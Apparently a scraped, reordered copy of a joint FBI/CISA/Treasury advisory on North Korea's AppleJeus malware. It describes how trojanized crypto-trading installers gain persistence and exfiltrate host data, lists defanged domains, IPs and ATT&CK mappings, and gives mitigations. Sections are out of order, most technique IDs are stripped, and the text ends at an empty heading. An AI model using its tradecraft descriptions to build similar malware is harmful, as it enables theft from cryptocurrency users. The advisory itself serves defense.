The program DorusioUpgrade.exe first installs itself as a service (Create or Modify System Process: Windows Service [T1543.003]), which will automatically start when any user logs on (Boot or Logon Autostart Execution [T1547]). The service is installed with a description stating it “Automatic Dorusio Upgrade.” When launched, it collects the victim’s host information (System Owner/User Discovery [T1033]), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel [T1041]).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs Dorusio in folder /Applications/Dorusio.app/Contents/MacOS/
Installs Dorusio_upgrade in folder /Applications/Dorusio.app/Contents/MacOS/
Executes a postinstall script

Creates DorusioDaemon folder in /Library/Application Support folder
Moves Dorusio_upgrade to the new folder
Moves com.dorusio.pkg.wallet.plist to folder /Library/LaunchDaemons/
Runs Dorusio_upgrade in the background



The Dorusio program is likely a copy of an open-source cryptocurrency wallet application and loads a legitimate-looking wallet program (fully functional). Aside from the Dorusio logo and two new services, the wallet appears to be the same as the Kupay Wallet. This application seems to be a modification of the open-source cryptocurrency wallet Copay distributed by Atlanta-based company BitPay.
The Dorusio_upgrade program calls its function CheckUpdate (which contains most of the logic functionality of the malware) and sends a POST to the C2 server with a connection named “Dorusio Wallet 2.1.0 (Check Update Osx)” (Application Layer Protocol: Web Protocols [T1071.001]). If the C2 server returns a file, it is decoded and written to the victim’s folder /private/tmp/Dorusio_update with permissions set by the command chmod 700 (only the user can read, write, and execute) (Command and Scripting Interpreter [T1059]). Stage 2 is then launched, and the malware, Dorusio_upgrade, returns to sleeping and checking in with the C2 server at predetermined intervals (Application Layer Protocol: Web Protocols [T1071.001]).
The postinstall script has similar functionality to other AppleJeus scripts (Command and Scripting Interpreter: Unix Shell [T1059.004]). It creates the DorusioDaemon folder in /Library/Application Support folder and then moves Dorusio_upgrade to the new folder. It moves the property list (plist) file com.dorusio.pkg.wallet.plist from the Installer package to the /Library/LaunchDaemons/ folder (Scheduled Task/Job: Launchd [T1053.004]). Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches Dorusio_upgrade and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]).
Payload
Neither the payload for the Windows nor macOS X malware could be downloaded; the C2 server is no longer accessible. The payloads are likely similar in functionality to the macOS X stage 2 from CoinGoTrade and Kupay Wallet, or the Windows stage 2 from Union Crypto.
For more details on AppleJeus Version 6: Dorusio, see MAR-10322463-6.v1.
AppleJeus 4, 5, and 6 Installation Conflictions
If a user attempts to install the Kupay Wallet, CoinGoTrade, and Dorusio applications on the same system, they will encounter installation conflicts.
If Kupay Wallet is already installed on a system and the user tries to install CoinGoTrade or Dorusio:

Pop-up windows appear, stating a more recent version of the program is already installed.

If CoinGoTrade is already installed on a system and the user attempts to install Kupay Wallet:

Kupay.exe will be installed in the C:\Program Files (x86)\CoinGoTrade\ folder.
All CoinGoTrade files will be deleted.
The folders and files contained in the C:\Users\<username>\AppData\Roaming\CoinGoTradeSupport will remain installed.
KupayUpgrade.exe is installed in the new folder C:\Users\<username>\AppData\Roaming\KupaySupport.

If Dorusio is already installed on a system and the user attempts to install Kupay Wallet:

Kupay.exe will be installed in the C:\Program Files (x86)\Dorusio\ folder.
All Dorusio.exe files will be deleted.
The folders and files contained in C:\Users\<username>\AppData\Roaming\DorusioSupport will remain installed.
KupayUpgrade.exe is installed in the new folder C:\Users\<username>\AppData\Roaming\KupaySupport.

AppleJeus Version 7: Ants2Whale
Introduction and Infrastructure
In late 2020, a new version of AppleJeus was identified called “Ants2Whale.” The site for this version of AppleJeus is ants2whale[.]com (Acquire Infrastructure: Domain [T1583.001]). The website shows a legitimate-looking cryptocurrency company and application. The website contains multiple spelling and grammar mistakes indicating the creator may not have English as a first language. The website states that to download Ants2Whale, a user must contact the administrator, as their product is a “premium package” (Develop Capabilities: Malware [T1587.001]).
The domain ants2whale[.]com resolved to IP address 198.54.114[.]237 from September 23, 2020, to January 22, 2021. The IP address is controlled by NameCheap, Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade[.]com and Dorusio[.]com.
The domain ants2whale[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Ants2Whale Application Analysis
Windows Program
As of late 2020, the Windows program was not available on VirusTotal. It is likely very similar to the macOS X version detailed below.
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs Ants2Whale in folder /Applications/Ants2whale.app/Contents/MacOS/Ants2whale
Installs Ants2WhaleHelper in folder /Library/Application Support/Ants2WhaleSupport/
Executes a postinstall script

Moves com.Ants2whale.pkg.wallet.plist to folder /Library/LaunchDaemons/
Runs Ants2WhaleHelper in the background



The Ants2Whale and Ants2WhaleHelper programs and the postinstall script function almost identically to previous versions of AppleJeus and will not be discussed in depth in this advisory.
For more details on AppleJeus Version 7: Ants2Whale, see MAR-10322463-7.v1.
ATT&CK Profile
Figure 2 and table 2 provide summaries of the MITRE ATT&CK techniques observed.

Figure 2: MITRE ATT&CK enterprise techniques used by AppleJeus
 
Table 2: MITRE ATT&CK techniques observed



Tactic Title
Technique ID
Technique Title 




Resource Development [TA0042]
T1583.001
Acquire Infrastructure: Domain


Resource Development [TA0042]
T1583.006
Acquire Infrastructure: Web Services


Resource Development [TA0042]
T1587.001
Develop Capabilities: Malware


Resource Development [TA0042]
T1588.003
Obtain Capabilities: Code Signing Certificates


Resource Development [TA0042]
T1588004
Obtain Capabilities: Digital Certificates


Initial Access [TA0001]
T1566.002
Phishing: Spearphishing Link


Execution [TA0002]
T1059
Command and Scripting Interpreter


Execution [TA0002]
T1059.004
Command and Scripting Interpreter: Unix Shell


Execution [TA0002]
T1204.002
User Execution: Malicious File


Persistence [TA0003]
T1053.004
Scheduled Task/Job: Launchd


Persistence [TA0003]
T1543.004
Create or Modify System Process: Launch Daemon


Persistence [TA0003]
T1547
Boot or Logon Autostart Execution


Privilege Escalation [TA0004]
T1053.005
Scheduled Task/Job: Scheduled Task


Defense Evasion [TA0005]
T1027
Obfuscated Files or Information


Defense Evasion [TA0005]
T1548
Abuse Elevation Control Mechanism


Defense Evasion [TA0005]
T1564.001
Hide Artifacts: Hidden Files and Directories


Discovery [TA0007]
T1033
System Owner/User Discovery


Exfiltration [TA0010]
T1041
Exfiltration Over C2 Channel


Command and Control [TA0011]
T1071.001

Application Layer Protocol: Web Protocols



Command and Control [TA0011]
T1573
Encrypted Channel


Command and Control [TA0011]
T1573.001
Encrypted Channel: Symmetric Cryptography




Mitigations

Compromise Mitigations
Organizations that identify AppleJeus malware within their networks should take immediate action. Initial actions should include the following steps.

Contact the FBI, CISA, or Treasury immediately regarding any identified activity related to AppleJeus. (Refer to the Contact Information section below.)
Initiate your organization’s incident response plan.
Generate new keys for wallets, and/or move to new wallets.
Introduce a two-factor authentication solution as an extra layer of verification.  
Use hardware wallets, which keep the private keys in a separate, secured storage area.
To move funds out off a compromised wallet:

Do not use the malware listed in this advisory to transfer funds, and  
Form all transactions offline and then broadcast them to the network all at once in a short online session, ideally prior to the attacker accessing them.


Remove impacted hosts from network.
Assume the threat actors have moved laterally within the network and downloaded additional malware.
Change all passwords to any accounts associated with impacted hosts.
Reimage impacted host(s).  
Install anti-virus software to run daily deep scans of the host.
Ensure your anti-virus software is setup to download the latest signatures daily.
Install a Host Based Intrusion Detection (HIDS)-based software and keep it up to date.
Ensure all software and hardware is up to date, and all patches have been installed.
Ensure network-based firewall is installed and/or up to date.
Ensure the firewall’s firmware is up to date.

Pro-Active Mitigations
Consider the following recommendations for defense against AppleJeus malware and related activity.
Cryptocurrency Users

Verify source of cryptocurrency-related applications.
Use multiple wallets for key storage, striking the appropriate risk balance between hot and cold storage.
Use custodial accounts with multi-factor authentication mechanisms for both user and device verification.
Patronize cryptocurrency service businesses that offer indemnity protections for lost or stolen cryptocurrency.
Consider having a dedicated device for cryptocurrency management.

Financial Service Companies

Verify compliance with Federal Financial Institutions Examination Council (FFIEC) handbooks at https://ithandbook.ffiec.gov, especially those related to information security.
Report suspicious cyber and financial activities. For more information on mandatory and voluntary reporting of cyber events via suspicious activity reports, see the Financial Crimes Enforcement Network (FinCEN) Advisory FIN-2016-A005: Advisory to Financial Institutions on Cyber- Events and Cyber-Enabled Crime at https://www.fincen.gov/sites/default/files/advisory/2016-10-25/Cyber%20Threats%20Advisory%20-%20FINAL%20508_2.pdf and FinCEN’s Section 314(b) Fact Sheet at https://www.fincen.gov/sites/default/files/shared/314bfactsheet.pdf.

Cryptocurrency Businesses

Verify compliance with the Cryptocurrency Security Standard at http://cryptoconsortium.github.io/CCSS/.

All Organizations

Incorporate IOCs identified in CISA’s Malware Analysis Reports on https://us-cert.cisa.gov/northkorea into intrusion detection systems and security alert systems to enable active blocking or reporting of suspected malicious activity.
See table 3 below, which provides a summary of preventative ATT&CK mitigations based on observed techniques.

Table 3: MITRE ATT&CK mitigations based on observed techniques



Mitigation
Description




User Training [M1017]
Train users to identify social engineering techniques and spearphishing emails.


User Training [M1017]
Provide users with the awareness of common phishing and spearphishing techniques and raise suspicion for potentially malicious events.


User Account Management [M1018]
Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons.


User Account Management [M1018]
Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.


SSL/TLS Inspection [M1020]
Use SSL/TLS inspection to see encrypted sessions’ contents to look for network-based indicators of malware communication protocols.


Restrict Web-Based Content [M1021]
Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if the activity cannot be monitored well or poses a significant risk.


Restrict Web-Based Content [M1021]
Block Script extensions to prevent the execution of scripts and HTA files that may commonly be used during the exploitation process.


Restrict Web-Based Content [M1021]
Employ an adblocker to prevent malicious code served up through ads from executing.


Restrict File and Directory Permissions [M1022]
Prevent all users from writing to the /Library/StartupItems directory to prevent any startup items from getting registered since StartupItems are deprecated.


Privileged Account Management [M1026]
When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.


Privileged Account Management [M1026]
Configure the Increase Scheduling Priority option only to allow the Administrators group the rights to schedule a priority process.


Operating System Configuration [M1028]
Configure settings for scheduled tasks to force tasks to run under the authenticated account’s context instead of allowing them to run as SYSTEM.


Network Intrusion Prevention [M1031]
Use network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware and mitigate activity at the network level.


Execution Prevention [M1038]
Use application control tools where appropriate.


Execution Prevention [M1038]
Use application control tools to prevent the running of executables masquerading as other files.


Behavior Prevention on Endpoint [M1040]
Configure endpoint (if possible) to block some process injection types based on common sequences of behavior during the injection process.


Disable or Remove Feature or Program [M1042]
Disable or remove any unnecessary or unused shells or interpreters.


Code Signing [M1045]
Where possible, only permit the execution of signed scripts.


Audit [M1047]
Audit logging for launchd events in macOS can be reviewed or centrally collected using multiple options, such as Syslog, OpenBSM, or OSquery.


Audit [M1047]
Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.


Antivirus/Antimalware [M1049]
Use an antivirus program to quarantine suspicious files automatically.



 

Contact Information

Recipients of this report are encouraged to contribute any additional information that they may have related to this threat.
For any questions related to this report or to report an intrusion and request resources for incident response or technical assistance, please contact:

The FBI through the FBI Cyber Division (855-292-3937 or CyWatch@fbi.gov) or a local field office,
CISA (888-282-0870 or Central@cisa.dhs.gov), or
Treasury Office of Cybersecurity and Critical Infrastructure Protection (Treasury OCCIP) (202-622-3000 or OCCIP-Coord@treasury.gov).


References

[1] CISA Alert AA20-239A: FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks
[2] Department of the Treasury Press Release: Treasury Sanctions Individuals Laundering Cryptocurrency for Lazarus Group
[3] Department of Justice Press Release: Two Chinese Nationals Charged with Laundering Over $100 Million in Cryptocurrency From Exchange Hack
[4] CISA Alert TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL
[5] CISA Alert TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL 
[6] MITRE ATT&CK Software: FALLCHILL
[7] SecureList: Operation AppleJeus Sequel
[8] GitHub: Blackbird Bitcoin Arbitrage

Revisions

February 17, 2021: Initial Version|April 15, 2021: Updated MITRE ATT&CK technique from Command and Scripting Interpreter: AppleScript [T1059.002] to Command and Scripting Interpreter: Unix Shell [T1059.004].






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'TA0003', 'T1588.003', 'T15880', 'T1566.002', 'TA0010', 'T1059.004', 'T1573.001', 'TA0005', 'T1204.002', 'T1573', 'T1583.006', 'T1059.002', 'TA0011', 'T1564.001', 'T1027', 'T1547', 'T1543.003', 'T1543.004', 'TA0001', 'T1053.004', 'TA0002', 'T1033', 'T1548', 'T1059', 'T1587.001', 'T1583.001', 'T1071.001', 'TA0042', 'TA0004', 'T1053.005', 'T1588.004', 'TA0007'}","




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint advisory is the result of analytic efforts among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasury (Treasury) to highlight the cyber threat to cryptocurrency posed by North Korea, formally known as the Democratic People’s Republic of Korea (DPRK), and provide mitigation recommendations. Working with U.S. government partners, FBI, CISA, and Treasury assess that Lazarus Group—which these agencies attribute to North Korean state-sponsored advanced persistent threat (APT) actors—is targeting individuals and companies, including cryptocurrency exchanges and financial service companies, through the dissemination of cryptocurrency trading applications that have been modified to include malware that facilitates theft of cryptocurrency.
These cyber actors have targeted organizations for cryptocurrency theft in over 30 countries during the past year alone. It is likely that these actors view modified cryptocurrency trading applications as a means to circumvent international sanctions on North Korea—the applications enable them to gain entry into companies that conduct cryptocurrency transactions and steal cryptocurrency from victim accounts. As highlighted in FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks and Guidance on the North Korean Cyber Threat, North Korea’s state-sponsored cyber actors are targeting cryptocurrency exchanges and accounts to steal and launder hundreds of millions of dollars in cryptocurrency.,1,2,3, The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.cisa.gov/northkorea.
The U.S. Government has identified malware and indicators of compromise (IOCs) used by the North Korean government to facilitate cryptocurrency thefts; the cybersecurity community refers to this activity as “AppleJeus.” This report catalogues AppleJeus malware in detail. North Korea has used AppleJeus malware posing as cryptocurrency trading platforms since at least 2018. In most instances, the malicious application—seen on both Windows and Mac operating systems—appears to be from a legitimate cryptocurrency trading company, thus fooling individuals into downloading it as a third-party application from a website that seems legitimate. In addition to infecting victims through legitimate-looking websites, HIDDEN COBRA actors also use phishing, social networking, and social engineering techniques to lure users into downloading the malware.
Refer to the following Malware Analysis Reports (MARs) for full technical details of AppleJeus malware and associated IOCs.

MAR-10322463-1.v1: AppleJeus – Celas Trade Pro
MAR-10322463-2.v1: AppleJeus – JMT Trading
MAR-10322463-3.v1: AppleJeus – Union Crypto
MAR-10322463-4.v1: AppleJeus – Kupay Wallet
MAR-10322463-5.v1: AppleJeus – CoinGoTrade
MAR-10322463-6.v1: AppleJeus – Dorusio
MAR-10322463-7.v1: AppleJeus – Ants2Whale

Click here for a PDF version of this report.

Technical Details

The North Korean government has used multiple versions of AppleJeus since the malware was initially discovered in 2018. This section outlines seven of the versions below. The MARs listed above provide further technical details of these versions. Initially, HIDDEN COBRA actors used websites that appeared to host legitimate cryptocurrency trading platforms to infect victims with AppleJeus; however, these actors are now also using other initial infection vectors, such as phishing, social networking, and social engineering techniques, to get users to download the malware.
Targeted Nations
HIDDEN COBRA actors have targeted institutions with AppleJeus malware in several sectors, including energy, finance, government, industry, technology, and telecommunications. Since January 2020, the threat actors have targeted these sectors in the following countries: Argentina, Australia, Belgium, Brazil, Canada, China, Denmark, Estonia, Germany, Hong Kong, Hungary, India, Ireland, Israel, Italy, Japan, Luxembourg, Malta, the Netherlands, New Zealand, Poland, Russia, Saudi Arabia, Singapore, Slovenia, South Korea, Spain, Sweden, Turkey, the United Kingdom, Ukraine, and the United States (figure 1).
 

 
Figure 1: Countries targeted with AppleJeus by HIDDEN COBRA threat actors since 2020
AppleJeus Versions Note
The version numbers used for headings in this document correspond to the order the AppleJeus campaigns were identified in open source or through other investigative means. These versions may or may not be in the correct order to develop or deploy the AppleJeus campaigns.
AppleJeus Version 1: Celas Trade Pro
Introduction and Infrastructure
In August 2018, open-source reporting disclosed information about a trojanized version of a legitimate cryptocurrency trading application on an undisclosed victim’s computer. The malicious program, known as Celas Trade Pro, was a modified version of the benign Q.T. Bitcoin Trader application. This incident led to the victim company being infected with a Remote Administration Tool (RAT) known as FALLCHILL, which was attributed to North Korea (HIDDEN COBRA) by the U.S. Government. FALLCHILL is a fully functional RAT with multiple commands that the adversary can issue from a command and control (C2) server to infected systems via various proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware (Develop Capabilities: Malware,). Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.,4,
Further research revealed that a phishing email from a Celas LLC company (Phishing: Spearphishing Link,) recommended the trojanized cryptocurrency trading application to victims. The email provided a link to the Celas’ website, celasllc,.,com (Acquire Infrastructure: Domain,), where the victim could download a Windows or macOS version of the trojanized application.
The celasllc,.,com domain resolved to the following Internet Protocol (IP) addresses from May 29, 2018, to January 23, 2021.

45.199.63,.,220
107.187.66,.,103
145.249.106,.,19
175.29.32,.,160
185.142.236,.,213
185.181.104,.,82
198.251.83,.,27
208.91.197,.,46
209.99.64,.,18

The celasllc,.,com domain had a valid Sectigo (previously known as Comodo) Secure Sockets Layer (SSL) certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Celas Trade Pro Application Analysis
Windows Program
The Windows version of the malicious Celas Trade Pro application is an MSI Installer (.msi). The MSI Installer installation package comprises a software component and an application programming interface (API) that Microsoft uses for the installation, maintenance, and removal of software. The installer looks legitimate and is signed by a valid Sectigo certificate that was purchased by the same user as the SSL certificate for celasllc,.,com (Obtain Capabilities: Code Signing Certificates,). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File,).
Once permission is granted, the threat actor is able to run the program with elevated privileges (Abuse Elevation Control Mechanism,) and MSI executes the following actions.

Installs CelasTradePro.exe in folder C:\Program Files (x86)\CelasTradePro
Installs Updater.exe in folder C:\Program Files (x86)\CelasTradePro
Runs Updater.exe with the CheckUpdate parameters

The CelasTradePro.exe program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
The Updater.exe program has the same program icon as CelasTradePro.exe. When run, it checks for the CheckUpdate parameter, collects the victim’s host information (System Owner/User Discovery,), encrypts the collected information with a hardcoded XOR encryption, and sends information to a C2 website (Exfiltration Over C2 Channel,).
macOS X Program
The macOS version of the malicious application is a DMG Installer that has a disk image format that Apple commonly uses to distribute software over the internet. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates,). It has very similar functionality to the Windows version. The installer executes the following actions.

Installs CelasTradePro in folder /Applications/CelasTradePro.app/Contents/MacOS/
Installs Updater in folder /Applications/CelasTradePro.app/Contents/MacOS
Executes a postinstall script

Moves .com.celastradepro.plist to folder LaunchDaemons
Runs Updater with the CheckUpdate parameter



CelasTradePro asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
Updater checks for the CheckUpdate parameter and, when found, it collects the victim’s host information (System Owner/User Discovery,), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel,). This process helps the adversary obtain persistence on a victim’s network.
The postinstall script is a sequence of instructions that runs after successfully installing an application (Command and Scripting Interpreter: Unix Shell,). This script moves property list (plist) file .com.celastradepro.plist from the installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd,). The leading “.” makes it unlisted in the Finder app or default Terminal directory listing (Hide Artifacts: Hidden Files and Directories,). Once in the folder, this property list (plist) file will launch the Updater program with the CheckUpdate parameter on system load as Root for every user. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches the Updater program with the CheckUpdate parameter and runs it in the background (Create or Modify System Process: Launch Daemon,).
Payload
After a cybersecurity company published a report detailing the above programs and their malicious extras, the website was no longer accessible. Since this site was the C2 server, the payload cannot be confirmed. The cybersecurity company that published the report states the payload was an encrypted and obfuscated binary (Obfuscated Files or Information,), which eventually drops FALLCHILL onto the machine and installs it as a service (Create or Modify System Process: Windows Service,). FALLCHILL malware uses an RC4 encryption algorithm with a 16-byte key to protect its communications (Encrypted Channel: Symmetric Cryptography,). The key employed in these versions has also been used in a previous version of FALLCHILL.,5,6,
For more details on AppleJeus Version 1: Celas Trade Pro, see MAR-10322463-1.v1.
AppleJeus Version 2: JMT Trading
Introduction and Infrastructure
In October 2019, a cybersecurity company identified a new version of the AppleJeus malware—JMT Trading—thanks to its many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which a legitimate-looking company, called JMT Trading, marketed and distributed on their website, jmttrading,.,org (Acquire Infrastructure: Domain,). This website contained a “Download from GitHub” button, which linked to JMT Trading’s GitHub page (Acquire Infrastructure: Web Services,), where Windows and macOS X versions of the JMT Trader application were available for download (Develop Capabilities: Malware,). The GitHub page also included .zip and tar.gz files containing the source code.
The jmttrading,.,org domain resolved to the following IP addresses from October 15, 2016, to January 22, 2021.

45.33.2,.,79
45.33.23,.,183
45.56.79,.,23
45.79.19,.,196
96.126.123,.,244
146.112.61,.,107
184.168.221,.,40
184.168.221,.,57
198.187.29,.,20
198.54.117,.,197
198.54.117,.,198
198.54.117,.,199
198.54.117,.,200
198.58.118,.,167

The jmttrading,.,org domain had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence. The current SSL certificate was issued by Let’s Encrypt.
JMT Trading Application Analysis
Windows Program
The Windows version of the malicious cryptocurrency application is an MSI Installer. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates,). The signature was signed with a code signing certificate purchased by the same user as the SSL certificate for jmttrading,.,org (Obtain Capabilities: Code Signing Certificates,). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File,).
Once permission is granted, the MSI executes the following actions.

Installs JMTTrader.exe in folder C:\Program Files (x86)\JMTTrader
Installs CrashReporter.exe in folder C:\Users\<username>\AppData\Roaming\JMTTrader
Runs CrashReporter.exe with the Maintain parameter

The JMTTrader.exe program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to CelasTradePro.exe and the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
The program CrashReporter.exe is heavily obfuscated with the ADVObfuscation library, renamed “snowman” (Obfuscated Files or Information,). When run, it checks for the Maintain parameter and collects the victim’s host information (System Owner/User Discovery,), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel,). The program also creates a scheduled SYSTEM task, named JMTCrashReporter, which runs CrashReporter.exe with the Maintain parameter at any user’s login (Scheduled Task/Job: Scheduled Task,).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs JMTTrader in folder /Applications/JMTTrader.app/Contents/MacOS/
Installs .CrashReporter in folder /Applications/JMTTrader.app/Contents/Resources/

Note: the leading “.” makes it unlisted in the Finder app or default Terminal directory listing.


Executes a postinstall script

Moves .com.jmttrading.plist to folder LaunchDaemons
Changes the file permissions on the plist
Runs CrashReporter with the Maintain parameter
Moves .CrashReporter to folder /Library/JMTTrader/CrashReporter
Makes .CrashReporter executable



The JMTTrader program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to CelasTradePro and the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.
The CrashReporter program checks for the Maintain parameter and is not obfuscated. This lack of obfuscation makes it easier to determine the program’s functionality in detail. When it finds the Maintain parameter, it collects the victim’s host information (System Owner/User Discovery,), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel,).
The postinstall script has similar functionality to the one used by CelasTradePro, but it has a few additional features (Command and Scripting Interpreter: Unix Shell,). It moves the property list (plist) file .com.jmttrading.plist from the Installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd,), but also changes the file permissions on the plist file. Once in the folder, this property list (plist) file will launch the CrashReporter program with the Maintain parameter on system load as Root for every user. Also, the postinstall script moves the .CrashReporter program to a new location /Library/JMTTrader/CrashReporter and makes it executable. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches CrashReporter with the Maintain parameter and runs it in the background (Create or Modify System Process: Launch Daemon,).
Payload
Soon after the cybersecurity company tweeted about JMT Trader on October 11, 2019, the files on GitHub were updated to clean, non-malicious installers. Then on October 13, 2019, a different cybersecurity company published an article detailing the macOS X JMT Trader, and soon after, the C2 beastgoc,.,com website went offline. There is not a confirmed sample of the payload to analyze at this point.
For more details on AppleJeus Version 2: JMT Trading, see MAR-10322463-2.v1.
AppleJeus Version 3: Union Crypto
Introduction and Infrastructure
In December 2019, another version of the AppleJeus malware was identified on Twitter by a cybersecurity company based on many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which was marketed and distributed by a legitimate-looking company, called Union Crypto, on their website, unioncrypto,.,vip (Acquire Infrastructure: Domain,). Although this website is no longer available, a cybersecurity researcher discovered a download link, https://www.unioncrypto,.,vip/download/W6c2dq8By7luMhCmya2v97YeN, recorded on VirusTotal for the macOS X version of UnionCryptoTrader. In contrast, open-source reporting stated that the Windows version might have been downloaded via instant messaging service Telegram, as it was found in a “Telegram Downloads” folder on an unnamed victim.,7,
The unioncrypto,.,vip domain resolved to the following IP addresses from June 5, 2019, to July 15, 2020.

104.168.167,.,16
198.54.117,.,197
198.54.117,.,198
198.54.117,.,199
198.54.117,.,200

The domain unioncrypto,.,vip had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Union Crypto Trader Application Analysis
Windows Program
The Windows version of the malicious cryptocurrency application is a Windows executable (.exe) (User Execution: Malicious File,), which acts as an installer that extracts a temporary MSI Installer.
The Windows program executes the following actions.

Extracts UnionCryptoTrader.msi to folder C:\Users\<username>\AppData\Local\Temp\{82E4B719-90F74BD1-9CF1-56CD777E0C42}
Runs UnionCryptoUpdater.msi

Installs UnionCryptoTrader.exe in folder C:\Program Files\UnionCryptoTrader
Installs UnionCryptoUpdater.exe in folder C:\Users\<username>\AppData\Local\UnionCryptoTrader


Deletes UnionCryptoUpdater.msi
Runs UnionCryptoUpdater.exe

The program UnionCryptoTrader.exe loads a legitimate-looking cryptocurrency arbitrage application—defined as “the simultaneous buying and selling of securities, currency, or commodities in different markets or in derivative forms to take advantage of differing prices for the same asset”—which exhibits no signs of malicious activity. This application is very similar to another cryptocurrency arbitrage application known as Blackbird Bitcoin Arbitrage.,8,
The program UnionCryptoUpdater.exe first installs itself as a service (Create or Modify System Process: Windows Service,), which will automatically start when any user logs on (Boot or Logon Autostart Execution,). The service is installed with a description stating it “Automatically installs updates for Union Crypto Trader.” When launched, it collects the victim’s host information (System Owner/User Discovery,), combines the information in a string that is MD5 hashed and stored in the auth_signature variable before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel,).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs UnionCryptoTrader in folder /Applications/UnionCryptoTrader.app/Contents/MacOS/
Installs .unioncryptoupdater in folder /Applications/UnionCryptoTrader.app/Contents/Resources/

Note: the leading “.” makes it unlisted in the Finder app or default Terminal directory listing


Executes a postinstall script

Moves .vip.unioncrypto.plist to folder LaunchDaemons
Changes the file permissions on the plist to Root
Runs unioncryptoupdater
Moves .unioncryptoupdater to folder /Library/UnionCrypto/unioncryptoupdater
Makes .unioncryptoupdater executable



The UnionCryptoTrader program loads a legitimate-looking cryptocurrency arbitrage application, which exhibits no signs of malicious activity. The application is very similar to another cryptocurrency arbitrage application known as Blackbird Bitcoin Arbitrage.
The .unioncryptoupdater program is signed ad-hoc, meaning it is not signed with a valid code-signing identity. When launched, it collects the victim’s host information (System Owner/User Discovery,), combines the information in a string that is MD5 hashed and stored in the auth_signature variable before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel,).
The postinstall script has similar functionality to the one used by JMT Trading (Command and Scripting Interpreter: Unix Shell,). It moves the property list (plist) file .vip.unioncrypto.plist from the Installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd,), but also changes the file permissions on the plist file to Root. Once in the folder, this property list (plist) file will launch the .unioncryptoupdater on system load as Root for every user. The postinstall script moves the .unioncryptoupdater program to a new location /Library/UnionCrypto/unioncryptoupdater and makes it executable. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches .unioncryptoupdater and runs it in the background (Create or Modify System Process: Launch Daemon,).
Payload
